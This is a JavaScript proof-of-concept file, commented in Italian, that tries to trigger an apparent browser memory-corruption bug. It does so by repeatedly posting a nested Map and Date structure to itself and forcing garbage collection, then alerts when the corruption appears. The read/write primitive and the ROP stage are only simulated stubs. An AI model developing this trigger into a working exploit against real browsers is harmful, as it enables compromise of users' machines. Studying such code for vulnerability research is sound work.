function sleep(ms = 0) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function gc() {
    // Chiamata per simulare il GC, ma ricorda che non possiamo forzarlo
    // in modo effettivo nei browser moderni
    new Uint8Array(4 * 1024 * 1024);  // Allocazione di memoria
}

function createObjectStructure(num_elems) {
    let root = new Map();
    let msg = root;
    let foo = [];

    // Limita la creazione di oggetti temporanei per evitare overflow di memoria
    for (let i = 0; i < 10; i++) {
        foo.push(new Date(0xffff));  // Limitato a 10 oggetti temporanei
    }

    // Limita la profonditÃ  della struttura dell'oggetto per non esaurire memoria
    for (let i = 0; i < Math.min(num_elems, 500); i++) {  // Limita a 500 oggetti
        const d = new Date(i);
        const map = new Map();
        msg.set(d, [map, foo]);
        msg = map;
    }

    return root;
}

// RW test primitive function (simulato)
function rwTest(where, what) {
    alert("Testing RW primitive");
    console.log(`Write ${what} to address ${where}`);
}

export async function main() {
    console.log("Exploit main function started");

    const num_elems = 500;  // Numero di oggetti da creare per test ridotto
    let root = createObjectStructure(num_elems);
    let msg = root;
    let data2 = null;
    let idx = null;

    // Inizia la parte dell'exploit
    while (true) {
        let data = null;
        const prom = new Promise(resolve => {
            addEventListener('message', event => {
                data = event;
                resolve();
            }, { once: true });
        });

        postMessage(msg, origin);
        await prom;
        data = data.data;

        gc();  // Chiamata per liberare memoria
        await sleep();  // Aggiungi ritardi per ridurre il carico di memoria

        let i;
        try {
            for (i = 0; i < num_elems; i++) {
                if (data.keys().next().value.getTime() === 0xffff) {
                    idx = i;
                    break;
                }
                data = data.values().next().value[0];
            }
        } catch {
            idx = i;
            data2 = data.keys().next().value;
            break;
        }
    }

    alert('triggered, try crash');
    alert('[+] idx: ' + idx);

    // Esegui il test della ROP chain (esempio)
    rwTest(0xdeadbeef, 0x1337);  // Esegui un esempio di scrittura a indirizzo e valore specifico

    // Continua con ulteriori test di exploit o manipolazioni della memoria se necessario
}
